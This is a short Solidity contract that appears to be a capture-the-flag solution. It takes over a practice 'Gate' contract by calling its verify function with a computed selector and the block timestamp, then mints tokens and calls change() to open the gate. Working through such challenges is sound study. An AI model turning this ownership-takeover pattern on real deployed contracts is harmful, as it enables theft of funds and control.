// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Gate.sol";

/// @title Test Gate
/// @author Mohan Chaudhari
/// @dev TakeOwnership takes the ownership of Gate contract

contract Test {
Gate public gate;
constructor(address gateAddress) {
    gate = Gate(gateAddress);
}
///  Function to get ownership of Gate contract 
function takeOwnership() external {
    // Call the verify function with the expected parameters to take ownership
    bytes4 sig = bytes4(keccak256("verify(bytes4,uint256)"));
    uint256 blocktimestamp = block.timestamp;
    gate.verify(sig, blocktimestamp);
}

///change `open` variable value to true in Gate contract.
function openGate() external {
    // Check that the Test contract has ownership
    require(gate.owner() == address(this), "Test contract does not own Gate");

    gate.mint(address(gate), 10e18);
    gate.mint(msg.sender, 10e18);
    gate.mint(address(this), 10e18);
    gate.transfer(address(1), 10e18);

    gate.change();
}
}